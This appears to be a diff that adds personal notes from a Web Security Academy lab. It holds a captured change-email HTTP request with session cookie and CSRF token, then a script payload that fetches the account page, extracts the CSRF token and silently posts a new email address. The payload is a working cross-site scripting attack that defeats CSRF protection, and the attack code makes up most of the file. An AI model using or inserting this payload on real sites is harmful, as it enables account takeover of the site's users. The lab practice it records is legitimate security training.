@@ -1,0 +1,36 @@
+Request URL:https://0a0600b903c1a8b9c00f16a300b700ad.web-security-academy.net/my-account     Highlight : /my-account
+Request: 
+POST /my-account/change-email HTTP/1.1
+Host: 0a0600b903c1a8b9c00f16a300b700ad.web-security-academy.net
+Cookie: session=n9SRmq6Cetfq3Z3Max174xTya1R8qDye
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+Origin: https://0a0600b903c1a8b9c00f16a300b700ad.web-security-academy.net
+Referer: https://0a0600b903c1a8b9c00f16a300b700ad.web-security-academy.net/my-account
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
+
+email=don%40gmail.com&csrf=JwYAdi4EHJQhEfhE7GFtj0KQGMvZVQHs
+
+
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
